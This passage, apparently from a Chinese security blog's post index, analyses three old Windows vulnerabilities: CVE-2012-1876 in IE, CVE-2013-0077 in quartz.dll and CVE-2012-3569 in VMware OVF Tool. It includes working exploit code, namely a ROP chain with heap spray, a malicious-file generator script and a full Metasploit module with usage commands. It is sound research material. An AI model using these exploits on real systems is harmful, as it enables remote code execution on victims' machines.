xchg eax,esp; retn (pivot)        mshtmlbase + Number(0x00352c8b),    // pop eax; retn        mshtmlbase + Number(0x00001340),    // ptr to &amp;VirtualAlloc() [IAT]        mshtmlbase + Number(0x00124ade),    // mov eax,[eax]; retn        mshtmlbase + Number(0x000af93e),    // xchg eax,esi; and al,0; xor eax,eax; retn        mshtmlbase + Number(0x00455a9c),    // pop ebp; retn        mshtmlbase + Number(0x00128b8d),    // &amp; jmp esp        mshtmlbase + Number(0x00061436),    // pop ebx; retn        0x00000001,                 // 0x00000001-&gt; ebx        mshtmlbase + Number(0x0052d8a3),    // pop edx; retn        0x00001000,                 // 0x00001000-&gt; edx        mshtmlbase + Number(0x00003670),    // pop ecx; retn        0x00000040,                 // 0x00000040-&gt; ecx        mshtmlbase + Number(0x001d263d),    // pop edi; retn        mshtmlbase + Number(0x000032ac),    // retn        mshtmlbase + Number(0x00352c9f),    // pop eax; retn        0x90909090,                 // nop        mshtmlbase + Number(0x0052e805),    // pushad; retn        0x90909090,        0x90909090,        0x90909090,        0x90909090,        0x90909090,                ];            return arr;        &#125;    function d2u(dword)&#123;      var uni = String.fromCharCode(dword &amp; 0xFFFF);      uni += String.fromCharCode(dword&gt;&gt;16);      return uni;    &#125;    function tab2uni(heapobj, tab)&#123;      var uni = &quot;&quot;      for(var i=0;i&lt;tab.length;i++)&#123;          uni += heapobj.d2u(tab[i]);      &#125;      return uni;    &#125;            heapobj.tab2uni = tab2uni;      heapobj.d2u = d2u;      heapobj.rop_chain = rop_chain;      var code = unescape(&quot;#&#123;js_code&#125;&quot;);      var rop_chain = heapobj.tab2uni(heapobj, heapobj.rop_chain(mshtmlbase)) ;      var shellcode = rop_chain + code      while (shellcode.length &lt; 100000)    shellcode = shellcode + shellcode;      var onemeg = shellcode.substr(0, 64*1024/2);      for (i=0; i&lt;14; i++) &#123;    onemeg += shellcode.substr(0, 64*1024/2);      &#125;      onemeg += shellcode.substr(0, (64*1024/2)-(38/2));      var spray = new Array();      for (i=0; i&lt;400; i++) &#123;    spray[i] = onemeg.substr(0, onemeg.length);      &#125;  &#125;  function smash_vtable()&#123;          var obj_col_0 = document.getElementById(&quot;132&quot;);    obj_col_0.width = &quot;1178993&quot;;                    // smash the vftable 0x07070024          obj_col_0.span = &quot;44&quot;;                          // the amount to overwrite  &#125;  var mshtmlbase = &quot;&quot;;  setTimeout(&quot;over_trigger();&quot;,1);    setTimeout(&quot;heap_spray();&quot;,400);  setTimeout(&quot;smash_vtable();&quot;,700);        SJ        # build html        content = &lt;&lt;-HTML        &lt;html&gt;        &lt;body&gt;        &lt;div id=&quot;test&quot;&gt;&lt;/div&gt;        &lt;script language=&#x27;javascript&#x27;&gt;        #&#123;heap_determinism&#125;        &lt;/script&gt;        #&#123;table_builder&#125;        &lt;script language=&#x27;javascript&#x27;&gt;        #&#123;trigger_js&#125;        &lt;/script&gt;        &lt;/body&gt;        &lt;/html&gt;        HTML        print_status(&quot;Sending exploit to #&#123;cli.peerhost&#125;:#&#123;cli.peerport&#125;...&quot;)        # Transmit the response to the client        send_response_html(cli, content)    endend\n\nVupen 为其构造的 Exploit 堪称是绕过 ASLR 进行漏洞利用的教课书，因此 CVE-2012-1876 常作为经典案例出现在漏洞研究相关的各类资料与文献中。MSF 的 Exploit 堆砌稍做了修改，但差别不大。漏洞触发和利用的思路为通过 Heap Spray 控制内存布局，构建表格触发堆溢出，通过第一次堆溢出获得 .dll 库的基址，第二次溢出劫持虚表然后通过 ROP 链创建可执行内存区域并执行 Payload。\n经典且为人熟知所以在此不再赘述，可以参阅知道创宇的博客-WinDbg 漏洞分析调试（二）或漏洞战争一书原文。不过有一个精简版的 exploit 我觉得很有意思也贴在这(转自migraine-sudo师傅)\n漏洞修复MS12-037 补丁将堆块使用逻辑修改为了只要 span 属性值发生更改就重新分配对应大小的堆块而不再像之前一样复用堆块进而修复了漏洞\nReferenceNVD - CVE-2012-1876CVE - CVE-2012-1876Microsoft 安全公告 MS12-037 - 严重Exploit Database - CVE-2012-1876漏洞战争Internet Explorer ArchitectureSeeBug WinDbg 漏洞分析调试（二）\n","categories":["Vulnerability Investigation"]},{"title":"CVE-2013-0077 漏洞研究","url":"/2024/10/10/Vulnerability%20Investigation/CVE-2013-0077-%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"2012 年 10 月 15 日 exploit-db 漏洞公布站点上发布了 QQPlayer 3.7.892 m2p quartz.dll Heap Pointer Overwrite PoC，后被人提交至乌云和 CNCERT。但经过腾讯安全应急响应团队（《漏洞战争》笔者）的分析，确认该漏洞与 QQ 影音无关，而是微软 DirectShow quartz.dll 在解析 M2P 文件时存在堆溢出漏洞，随后腾讯安全团队及时报与微软应急响应中心（MSRC），微软回复确认漏洞存在并于 2013 年 2 月 12 日发布补丁修复\n\n有一说一，这个漏洞我查了一圈也没太多提及的资料而且也就主要影响 Windows XP，《漏洞战争》作者把这个洞列为堆溢出漏洞经典漏洞疑似夹带私货\n\n影响范围：\nMicrosoft Windows XP SP2Microsoft Windows XP SP3Windows Server 2003 SP2Windows Vista SP2\n\n\n漏洞分析调试运行 QQ 影音并打开样本后触发 Access Violation 异常，开启 HTC 后重新加载执行发现程序发生了堆溢出，同时发现该指令位于 quartz.dll 内，使用 IDA 打开它并下载符号表后根据偏移量可定位到 ParseSequenceHeader 函数，其反汇编结果如下\n.text:7D0706CC.text:7D0706CC                               ; =============== S U B R O U T I N E =======================================.text:7D0706CC.text:7D0706CC                               ; Attributes: bp-based frame.text:7D0706CC.text:7D0706CC                               ; int __stdcall ParseSequenceHeader(const unsigned __int8 *, int, struct SEQHDR_INFO *).text:7D0706CC                               ?ParseSequenceHeader@@YGHPBEJPAUSEQHDR_INFO@@@Z proc near.text:7D0706CC                                                                       ; CODE XREF: CMpegVideoCodec::CheckInputType(CMediaType const *)+77↑p.text:7D0706CC                                                                       ; CVideoParse::ParseSequenceHeader(void)+1F↓p.text:7D0706CC                                                                       ; CNativeVideoParse::ParseBytes(__int64,uchar *,long,ulong)+106↓p.text:7D0706CC.text:7D0706CC                               arg_0= dword ptr  8.text:7D0706CC                               arg_4= dword ptr  0Ch.text:7D0706CC                               arg_8= dword ptr  10h.text:7D0706CC.text:7D0706CC 8B FF                         mov     edi, edi.text:7D0706CE 55                            push    ebp.text:7D0706CF 8B EC                         mov     ebp, esp.text:7D0706D1 56                            push    esi.text:7D0706D2 8B 75 08                      mov     esi, [ebp+arg_0].text:7D0706D5 F6 46 0A 20                   test    byte ptr [esi+0Ah], 20h.text:7D0706D9 75 07                         jnz     short loc_7D0706E2.text:7D0706D9.text:7D0706DB 33 C0                         xor     eax, eax.text:7D0706DD E9 0F 01 00 00                jmp     loc_7D0707F1.text:7D0706DD.text:7D0706E2                               ; ---------------------------------------------------------------------------.text:7D0706E2.text:7D0706E2                               loc_7D0706E2:                           ; CODE XREF: ParseSequenceHeader(uchar const *,long,SEQHDR_INFO *)+D↑j.text:7D0706E2 0F B6 46 04                   movzx   eax, byte ptr [esi+4].text:7D0706E6 0F B6 4E 05                   movzx   ecx, byte ptr [esi+5].text:7D0706EA C1 E0 08                      shl     eax, 8.text:7D0706ED 03 C1                         add     eax, ecx.text:7D0706EF 0F B6 4E 06                   movzx   ecx, byte ptr [esi+6].text:7D0706F3 C1 E0 08                      shl     eax, 8.text:7D0706F6 03 C1                         add     eax, ecx.text:7D0706F8 8B C8                         mov     ecx, eax.text:7D0706FA C1 E9 0C                      shr     ecx, 0Ch.text:7D0706FD 25 FF 0F 00 00                and     eax, 0FFFh.text:7D070702 57                            push    edi.text:7D070703 8B 7D 10                      mov     edi, [ebp+arg_8].text:7D070706 89 0F                         mov     [edi], ecx.text:7D070708 89 47 04                      mov     [edi+4], eax.text:7D07070B 8A 46 07                      mov     al, [esi+7].text:7D07070E 8A C8                         mov     cl, al.text:7D070710 80 E1 0F                      and     cl, 0Fh.text:7D070713 80 F9 08                      cmp     cl, 8.text:7D070716 76 02                         jbe     short loc_7D07071A.text:7D070716.text:7D070718 24 F7                         and     al, 0F7h.text:7D070718.text:7D07071A.text:7D07071A                               loc_7D07071A:                           ; CODE XREF: ParseSequenceHeader(uchar const *,long,SEQHDR_INFO *)+4A↑j.text:7D07071A A8 F0                         test    al, 0F0h.text:7D07071C 0F 84 CC 00 00 00             jz      loc_7D0707EE.text:7D07071C.text:7D070722 A8 0F                         test    al, 0Fh.text:7D070724 0F 84 C4 00 00 00             jz      loc_7D0707EE.text:7D070724.text:7D07072A 53                            push    ebx.text:7D07072B 0F B6 D8                      movzx   ebx, al.text:7D07072E 8B CB                         mov     ecx, ebx.text:7D070730 83 E1 0F                      and     ecx, 0Fh.text:7D070733 C1 E1 02                      shl     ecx, 2.text:7D070736 8B 81 F8 07 07 7D             mov     eax, ds:dword_7D0707F8[ecx].text:7D07073C 99                            cdq.text:7D07073D 68 E8 03 00 00                push    3E8h                            ; nDenominator.text:7D070742 89 47 10                      mov     [edi+10h], eax.text:7D070745 89 57 14                      mov     [edi+14h], edx.text:7D070748 8B 81 38 08 07 7D             mov     eax, ds:dword_7D070838[ecx].text:7D07074E 6A 09                         push    9                               ; nNumerator.text:7D070750 FF 77 10                      push    dword ptr [edi+10h]             ; nNumber.text:7D070753 89 47 18                      mov     [edi+18h], eax.text:7D070756 FF 15 9C 12 F7 7C             call    ds:__imp__MulDiv@12             ; MulDiv(x,x,x).text:7D070756.text:7D07075C 89 47 1C                      mov     [edi+1Ch], eax.text:7D07075F 0F B6 46 08                   movzx   eax, byte ptr [esi+8].text:7D070763 0F B6 4E 09                   movzx   ecx, byte ptr [esi+9].text:7D070767 C1 E0 08                      shl     eax, 8.text:7D07076A 03 C1                         add     eax, ecx.text:7D07076C 0F B6 4E 0A                   movzx   ecx, byte ptr [esi+0Ah].text:7D070770 C1 E0 08                      shl     eax, 8.text:7D070773 03 C1                         add     eax, ecx.text:7D070775 C1 E8 06                      shr     eax, 6.text:7D070778 3D FF FF 03 00                cmp     eax, 3FFFFh.text:7D07077D 89 47 20                      mov     [edi+20h], eax.text:7D070780 75 06                         jnz     short loc_7D070788.text:7D070780.text:7D070782 83 67 20 00                   and     dword ptr [edi+20h], 0.text:7D070786 EB 09                         jmp     short loc_7D070791.text:7D070786.text:7D070788                               ; ---------------------------------------------------------------------------.text:7D070788.text:7D070788                               loc_7D070788:                           ; CODE XREF: ParseSequenceHeader(uchar const *,long,SEQHDR_INFO *)+B4↑j.text:7D070788 69 C0 90 01 00 00             imul    eax, 190h.text:7D07078E 89 47 20                      mov     [edi+20h], eax.text:7D07078E.text:7D070791.text:7D070791                               loc_7D070791:                           ; CODE XREF: ParseSequenceHeader(uchar const *,long,SEQHDR_INFO *)+BA↑j.text:7D070791 C7 47 28 D0 07 00 00          mov     dword ptr [edi+28h], 7D0h.text:7D070798 C1 EB 04                      shr     ebx, 4.text:7D07079B 8B 04 9D 60 08 07 7D          mov     eax, ds:dword_7D070860[ebx*4].text:7D0707A2 89 47 24                      mov     [edi+24h], eax.text:7D0707A5 0F B6 4E 0B                   movzx   ecx, byte ptr [esi+0Bh].text:7D0707A9 33 C0                         xor     eax, eax.text:7D0707AB 8A 46 0A                      mov     al, [esi+0Ah].text:7D0707AE C1 E9 03                      shr     ecx, 3.text:7D0707B1 5B                            pop     ebx.text:7D0707B2 83 E0 1F                      and     eax, 1Fh.text:7D0707B5 C1 E0 05                      shl     eax, 5.text:7D0707B8 0B C1                         or      eax, ecx.text:7D0707BA C1 E0 0B                      shl     eax, 0Bh.text:7D0707BD 89 47 08                      mov     [edi+8], eax.text:7D0707C0 F6 46 0B 04                   test    byte ptr [esi+0Bh], 4.text:7D0707C4 74 0C                         jz      short loc_7D0707D2.text:7D0707C4.text:7D0707C6 B9 00 A0 00 00                mov     ecx, 0A000h.text:7D0707CB 3B C1                         cmp     eax, ecx.text:7D0707CD 7E 03                         jle     short loc_7D0707D2.text:7D0707CD.text:7D0707CF 89 4F 08                      mov     [edi+8], ecx.text:7D0707CF.text:7D0707D2.text:7D0707D2                               loc_7D0707D2:                           ; CODE XREF: ParseSequenceHeader(uchar const *,long,SEQHDR_INFO *)+F8↑j.text:7D0707D2                                                                       ; ParseSequenceHeader(uchar const *,long,SEQHDR_INFO *)+101↑j.text:7D0707D2 8B 4D 0C                      mov     ecx, [ebp+arg_4].text:7D0707D5 89 4F 30                      mov     [edi+30h], ecx.text:7D0707D8 8B C1                         mov     eax, ecx.text:7D0707DA C1 E9 02                      shr     ecx, 2.text:7D0707DD 83 C7 34                      add     edi, 34h ; &#x27;4&#x27;.text:7D0707E0 F3 A5                         rep movsd.text:7D0707E2 8B C8                         mov     ecx, eax.text:7D0707E4 83 E1 03                      and     ecx, 3.text:7D0707E7 33 C0                         xor     eax, eax.text:7D0707E9 F3 A4                         rep movsb.text:7D0707EB 40                            inc     eax.text:7D0707EC EB 02                         jmp     short loc_7D0707F0.text:7D0707EC.text:7D0707EE                               ; ---------------------------------------------------------------------------.text:7D0707EE.text:7D0707EE                               loc_7D0707EE:                           ; CODE XREF: ParseSequenceHeader(uchar const *,long,SEQHDR_INFO *)+50↑j.text:7D0707EE                                                                       ; ParseSequenceHeader(uchar const *,long,SEQHDR_INFO *)+58↑j.text:7D0707EE 33 C0                         xor     eax, eax.text:7D0707EE.text:7D0707F0.text:7D0707F0                               loc_7D0707F0:                           ; CODE XREF: ParseSequenceHeader(uchar const *,long,SEQHDR_INFO *)+120↑j.text:7D0707F0 5F                            pop     edi.text:7D0707F0.text:7D0707F1.text:7D0707F1                               loc_7D0707F1:                           ; CODE XREF: ParseSequenceHeader(uchar const *,long,SEQHDR_INFO *)+11↑j.text:7D0707F1 5E                            pop     esi.text:7D0707F2 5D                            pop     ebp.text:7D0707F3 C2 0C 00                      retn    0Ch.text:7D0707F3.text:7D0707F3                               ?ParseSequenceHeader@@YGHPBEJPAUSEQHDR_INFO@@@Z endp.text:7D0707F3.text:7D0707F3                               ; ---------------------------------------------------------------------------\n\n反编译得到\nint __stdcall ParseSequenceHeader(const unsigned __int8 *a1, int a2, struct SEQHDR_INFO *a3)&#123;  int v4; // eax  unsigned __int8 v5; // al  unsigned int v6; // ebx  int v7; // ecx  unsigned int v8; // eax  int v9; // eax  int v10; // [esp-14h] [ebp-18h]  if ( (a1[10] &amp; 0x20) == 0 )    return 0;  v4 = (a1[6] + ((a1[5] + (a1[4] &lt;&lt; 8)) &lt;&lt; 8)) &amp; 0xFFF;  *(_DWORD *)a3 = (unsigned int)(a1[6] + ((a1[5] + (a1[4] &lt;&lt; 8)) &lt;&lt; 8)) &gt;&gt; 12;  *((_DWORD *)a3 + 1) = v4;  v5 = a1[7];  if ( (v5 &amp; 0xFu) &gt; 8 )    v5 &amp;= ~8u;  if ( (v5 &amp; 0xF0) == 0 || (v5 &amp; 0xF) == 0 )    return 0;  v6 = v5;  v7 = v5 &amp; 0xF;  *((_QWORD *)a3 + 2) = dword_7D0707F8[v7];  v10 = *((_DWORD *)a3 + 4);  *((_DWORD *)a3 + 6) = dword_7D070838[v7];  *((_DWORD *)a3 + 7) = MulDiv(v10, 9, 1000);  v8 = (unsigned int)(a1[10] + ((a1[9] + (a1[8] &lt;&lt; 8)) &lt;&lt; 8)) &gt;&gt; 6;  *((_DWORD *)a3 + 8) = v8;  if ( v8 == 0x3FFFF )    *((_DWORD *)a3 + 8) = 0;  else    *((_DWORD *)a3 + 8) = 400 * v8;  *((_DWORD *)a3 + 10) = 2000;  *((_DWORD *)a3 + 9) = dword_7D070860[v6 &gt;&gt; 4];  v9 = ((a1[11] &gt;&gt; 3) | (32 * (a1[10] &amp; 0x1F))) &lt;&lt; 11;  *((_DWORD *)a3 + 2) = v9;  if ( (a1[11] &amp; 4) != 0 &amp;&amp; v9 &gt; 40960 )    *((_DWORD *)a3 + 2) = 40960;  *((_DWORD *)a3 + 12) = a2;  qmemcpy((char *)a3 + 52, a1, a2); //! Crash Point  return 1;&#125;\n\n栈回溯得出函数调用关系为 quartz!CBasePin::ReceiveConnection -&gt; quartz!CTransformInputPin::CheckMediaType -&gt; quartz!CMpegVideoCodec::CheckInputType -&gt; quartz!ParseSequenceHeader，而 ParseSequenceHeader 函数在主调函数中被调用时实参为\nParseSequenceHeader(    (const unsigned __int8 *)(v4 + 96),    *(_DWORD *)(v4 + 92),    (CMpegVideoCodec *)((char *)this + 640))\n\n结合函数签名与实参的数据类型能够推测出发生异常时程序正在向堆块中复制样本 .m2p 文件中的数据，事实上在调试器中查看 qmemcpy 时的 esi 指向的数据时也能印证了这点（全是 ‘A’）。参考 MPEG 码流结构，一个 Sequence Header 的全部数据就是从起始标记 \\x00\\x00\\x01\\xb3 到结束标记 \\x00\\x00\\x01\\x00  之间的数据（不包括 \\x00\\x00\\x01\\x00 本身），样本中这部分数据为\n003230b0 41 41 41 41 41 41 41 41 41 00 00 01 b3 41 41 41003230c0 41 41 41 ba 41 41 41 41 41 41 41 41 41 41 41 41003230d0 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41003230e0 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41003230f0 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 4100323100 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 4100323110 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 4100323120 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 4100323130 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 4100323140 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 4100323150 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 4100323160 41 41 41 41 41 41 41 41 41 41 41 41 42 42 42 4200323170 41 41 41 41 41 41 41 41 41 41 41 41 00 00 01 00\n\n共 195 字节，而 qmemcpy 的目标地址到堆块尾部只有 157 字节的空间，因此发生了堆溢出\n\nqmemcpy 目标地址到堆块尾部空间的测量方法有很多，由于 qmemcpy 的数据内容是已知的，在触发 Access Violation 异常时查看此时的 edi 前的 195 字节数据然后数起始标记 \\x00\\x00\\x01\\xb3 到 edi 的偏移量即可。当然更通用的做法应该是 qmemcpy 前下一个断点看 edi，触发 Access Violation 异常时查看 edi，然后计算二者的偏移量\n\n漏洞利用用来生成 PoC 的 exploit 已经实现了漏洞利用，即通过堆溢出覆盖虚表指针进而控制程序执行流\nExploit 分析l = 3315716 * &quot;A&quot;s1 = (        (0,&#x27;\\x00\\x00\\x01\\xba&#x27;),        (2048, &#x27;\\x00\\x00\\x01\\xba&#x27;),        (3289120, &#x27;\\x00\\x00\\x01\\xe0\\x07&#x27;),        (3289273, &#x27;\\x00\\x00\\x01\\xb3&#x27;), # 开始标志        (3289283, &#x27;\\xba&#x27;),        (3289452, &#x27;\\x42\\x42\\x42\\x42&#x27;),        (3289468, &#x27;\\x00\\x00\\x01\\x00&#x27;),        (3290359, &#x27;\\x00\\x00\\x01\\x00&#x27;),        (3301408, &#x27;\\x00\\x00\\x01\\xe0\\x07&#x27;),        (3303112, &#x27;\\x00\\x00\\x01\\x00&#x27;) # 结束标志    )# EAX overwrite(3289452, &#x27;\\x42\\x42\\x42\\x42&#x27;) call eax+0x24o = open(&quot;c:\\\\poc.m2p&quot;,&quot;wb&quot;)o.write(l)for i in range(len(s1)):    o.seek(s1[i][0], 0)    o.write(s1[i][1])o.close()\n\nExploit 的功能就是简单粗暴而有效的生成恶意 .m2p 文件，在此不再赘述\n漏洞修复Win 7 上的 quartz.dll (6.6.7600.16905) 不存在此漏洞，它将对数据的拷贝限制为 0x8C 以防止堆溢出，这也是 poc.m2p 只在 XP 崩溃而在 Win 7 不崩溃的原因\nReferenceNVD - CVE-2013-0077CVE - CVE-2013-0077Microsoft 安全公告 MS13-011 - 严重漏洞战争关于MS13-011 - 博客 - 腾讯安全应急响应中心\n","categories":["Vulnerability Investigation"]},{"title":"CVE-2012-3569 漏洞研究","url":"/2025/01/11/Vulnerability%20Investigation/CVE-2012-3569%20%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"开放虚拟机格式（Open Virtual Machine Format，OVF）是一种虚拟机分配格式，能够支持不同产品与组织之间共享虚拟机。VMware OVF Tool 是由 VMware 免费提供的一款支持虚拟的导入导出工具，支持以命令提示符的方式运行。该工具在解析 OVF 文件时存在格式化字符串漏洞，攻击者可以通过诱使用户加载恶意构造的 OVF 文件实现任意代码执行。\n影响范围:vmware:ovf_tool:2.1vmware:workstation:8.0-8.0.4vmware:player:4.0-4.0.4\n漏洞分析格式化字符串漏洞会破坏栈空间布局，因此通过打开样本从 Crash Point 开始动态分析会让漏洞分析变得举步维艰。考虑到格式化字符串漏洞的原因主要出现在打印函数的参数上，可以以相关打印函数作为漏洞分析的切入点。\n调试运行 ovftool.exe 并打开样本，查找常量表中的硬编码字符串，并查看其引用函数，递归查询其引用函数的交叉引用函数，并对所有的打印函数下断点。跟踪到 ovftool.exe 开始输出样本中的 ovf:capacityAllocationUnits 属性值时开始单步跟进，最终会在崩溃前定位到 std::basic_ostream 函数。查阅文档发现该函数定义为\ntemplate&lt;    class CharT,    class Traits = std::char_traits&lt;CharT&gt;&gt; class basic_ostream : virtual public std::basic_ios&lt;CharT, Traits&gt;\n\n该函数的主调函数在对其进行调用时所执行的代码片段反编译结果为\nv36 = v30[5];v20 = (int (__thiscall **)(_DWORD, _DWORD, _DWORD))(*(_DWORD *)v30[5] + 16);v21 = (*(int (__thiscall **)(int, int))(*(_DWORD *)v4 + 44))(v4, v19);v22 = (*v20)(v36, &amp;v28, v21);v31 = 1;v23 = v22;v24 = sub_401A90(&amp;dword_160C7D8, &quot; - &quot;);v25 = std::operator&lt;&lt;&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(v24, v23);std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v25, std::endl);   // Vulnerability Pointv31 = -1;std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v28);++v19;result = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)v4 + 36))(v4)\n\n注意到 Vulnerability Point 处的代码在调用 std::basic_ostream 的 operator 成员函数以进行格式化输出时没有对来自于外界输入的格式化字符参数进行检查和过滤，因而存在格式化字符串漏洞\n漏洞利用使用 MSF 搜索该漏洞的 exp\nmsfconsolemsf6 &gt; search cve-2012-3569\n\n搜索结果\nMatching Modules================   #  Name                                           Disclosure Date  Rank    Check  Description   -  ----                                           ---------------  ----    -----  -----------   0  exploit/windows/browser/ovftool_format_string  2012-11-08       normal  No     VMWare OVF Tools Format String Vulnerability   1  exploit/windows/fileformat/ovf_format_string   2012-11-08       normal  No     VMWare OVF Tools Format String VulnerabilityInteract with a module by name or index. For example info 1, use 1 or use exploit/windows/fileformat/ovf_format_string\n\n调用该模块并查看模块详情\nmsf6 &gt; use exploit/windows/fileformat/ovf_format_stringmsf6 exploit(windows/fileformat/ovf_format_string) &gt; info\n\n模块详情信息\nmsf6 exploit(windows/fileformat/ovf_format_string) &gt; info       Name: VMWare OVF Tools Format String Vulnerability     Module: exploit/windows/fileformat/ovf_format_string   Platform: Windows       Arch:  Privileged: No    License: Metasploit Framework License (BSD)       Rank: Normal  Disclosed: 2012-11-08Provided by:  Jeremy Brown  juan vazquez &lt;juan.vazquez@metasploit.com&gt;Available targets:      Id  Name      --  ----  =&gt;  0   VMWare OVF Tools 2.1 on Windows XP SP3Check supported:  NoBasic options:  Name      Current Setting  Required  Description  ----      ---------------  --------  -----------  FILENAME  msf.ovf          yes       The file name.Payload information:  Avoid: 158 charactersDescription:  This module exploits a format string vulnerability in VMWare OVF Tools 2.1 for  Windows. The vulnerability occurs when printing error messages while parsing a  a malformed OVF file. The module has been tested successfully with VMWare OVF Tools  2.1 on Windows XP SP3.References:  https://nvd.nist.gov/vuln/detail/CVE-2012-3569  OSVDB (87117)  http://www.securityfocus.com/bid/56468  https://www.vmware.com/security/advisories/VMSA-2012-0015.htmlView the full module info with the info -d command.\n\n使用该模块生成木马\nmsf6 exploit(windows/fileformat/ovf_format_string) &gt; set payload windows/execmsf6 exploit(windows/fileformat/ovf_format_string) &gt; set CMD calc.exemsf6 exploit(windows/fileformat/ovf_format_string) &gt; exploit\n\n随后 MSF 将生成 exp.ovf 文件，诱使目标打开即可实现漏洞利用\nExploit 分析该模块的 exp 位于\n/usr/share/metasploit-framework/modules/exploits/windows/fileformat/ovf_format_string.rb\n\nexp 的核心代码为\n### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule &lt; Msf::Exploit::Remote  Rank = NormalRanking  include Msf::Exploit::FILEFORMAT  def initialize(info = &#123;&#125;)    super(update_info(info,      &#x27;Name&#x27;           =&gt; &#x27;VMWare OVF Tools Format String Vulnerability&#x27;,      &#x27;Description&#x27;    =&gt; %q&#123;...&#125;,      &#x27;License&#x27;        =&gt; MSF_LICENSE,      &#x27;Author&#x27;         =&gt; [...],      &#x27;References&#x27;     =&gt; [...],      &#x27;Payload&#x27;        =&gt;        &#123;          &#x27;DisableNops&#x27;    =&gt; true,          &#x27;BadChars&#x27;       =&gt;            (0x00..0x08).to_a.pack(&quot;C*&quot;) +            &quot;\\x0b\\x0c\\x0e\\x0f&quot; +            (0x10..0x1f).to_a.pack(&quot;C*&quot;) +            (0x80..0xff).to_a.pack(&quot;C*&quot;) +            &quot;\\x22&quot;,          &#x27;StackAdjustment&#x27; =&gt; -3500,          &#x27;PrependEncoder&#x27; =&gt; &quot;\\x54\\x59&quot;, # push esp # pop ecx          &#x27;EncoderOptions&#x27; =&gt;            &#123;              &#x27;BufferRegister&#x27; =&gt; &#x27;ECX&#x27;,              &#x27;BufferOffset&#x27; =&gt; 6            &#125;        &#125;,      &#x27;Platform&#x27;       =&gt; &#x27;win&#x27;,      &#x27;Targets&#x27;        =&gt;        [          # vmware-ovftool-2.1.0-467744-win-i386.msi          [ &#x27;VMWare OVF Tools 2.1 on Windows XP SP3&#x27;,            &#123;              &#x27;Ret&#x27; =&gt; 0x7852753d,  # call esp # MSVCR90.dll 9.00.30729.4148 installed with VMware OVF Tools 2.1              &#x27;AddrPops&#x27; =&gt; 98,              &#x27;StackPadding&#x27; =&gt; 38081,              &#x27;Alignment&#x27; =&gt; 4096            &#125;          ],        ],      &#x27;Privileged&#x27;     =&gt; false,      &#x27;DisclosureDate&#x27; =&gt; &#x27;2012-11-08&#x27;,      &#x27;DefaultTarget&#x27;  =&gt; 0))    register_options(      [        OptString.new(&#x27;FILENAME&#x27;, [ true, &#x27;The file name.&#x27;,  &#x27;msf.ovf&#x27;]),      ])  end  def ovf    my_payload = rand_text_alpha(4) # ebp    my_payload &lt;&lt; [target.ret].pack(&quot;V&quot;) # eip # call esp    my_payload &lt;&lt; payload.encoded    fs = rand_text_alpha(target[&#x27;StackPadding&#x27;]) # Padding until address aligned to 0x10000 (for example 0x120000)    fs &lt;&lt; rand_text_alpha(target[&#x27;Alignment&#x27;]) # Align to 0x11000    fs &lt;&lt; my_payload    # 65536 =&gt; 0x10000    # 27    =&gt; Error message prefix length    fs &lt;&lt; rand_text_alpha(65536 - 27 - target[&#x27;StackPadding&#x27;] - target[&#x27;Alignment&#x27;] - my_payload.length - (target[&#x27;AddrPops&#x27;] * 8))    fs &lt;&lt; &quot;%08x&quot; * target[&#x27;AddrPops&#x27;] # Reach saved EBP    fs &lt;&lt; &quot;%hn&quot; # Overwrite LSW of saved EBP with 0x1000    ovf_file = &lt;&lt;-EOF&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Envelope vmw:buildId=&quot;build-162856&quot; xmlns=&quot;http://schemas.dmtf.org/ovf/envelope/1&quot;xmlns:cim=&quot;http://schemas.dmtf.org/wbem/wscim/1/common&quot;xmlns:ovf=&quot;http://schemas.dmtf.org/ovf/envelope/1&quot;xmlns:rasd=&quot;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_ResourceAllocationSettingData&quot;xmlns:vmw=&quot;https://www.vmware.com/schema/ovf&quot;xmlns:vssd=&quot;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_VirtualSystemSettingData&quot;xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;  &lt;References&gt;    &lt;File ovf:href=&quot;Small VM-disk1.vmdk&quot; ovf:id=&quot;file1&quot; ovf:size=&quot;68096&quot; /&gt;  &lt;/References&gt;  &lt;DiskSection&gt;    &lt;Info&gt;Virtual disk information&lt;/Info&gt;    &lt;Disk ovf:capacity=&quot;8&quot; ovf:capacityAllocationUnits=&quot;#&#123;fs&#125;&quot; ovf:diskId=&quot;vmdisk1&quot; ovf:fileRef=&quot;file1&quot; ovf:format=&quot;https://www.vmware.com/interfaces/specifications/vmdk.html#streamOptimized&quot; /&gt;  &lt;/DiskSection&gt;  &lt;VirtualSystem ovf:id=&quot;Small VM&quot;&gt;    &lt;Info&gt;A virtual machine&lt;/Info&gt;  &lt;/VirtualSystem&gt;&lt;/Envelope&gt;    EOF    ovf_file  end  def exploit    print_status(&quot;Creating &#x27;#&#123;datastore[&#x27;FILENAME&#x27;]&#125;&#x27;. This files should be opened with VMMWare OVF 2.1&quot;)    file_create(ovf)  endend\n\nexp 较短，实际上按照 ovf 文件格式和 ovftool.exe 处理文件的逻辑生成包含了被填充字符包裹的格式化字符串 payload 的恶意文件。具体利用思路为劫持栈帧返回地址使程序执行流跳转到设定好的 shellcode 处，参照注释即可在此不再赘述\n漏洞修复使格式化控制字符串为字面量或者不由外界控制即可，漏洞修复思路较为明确而官方补丁变动较大不便分析，故不再赘述\nReferencestd::basic_ostreamOfficial 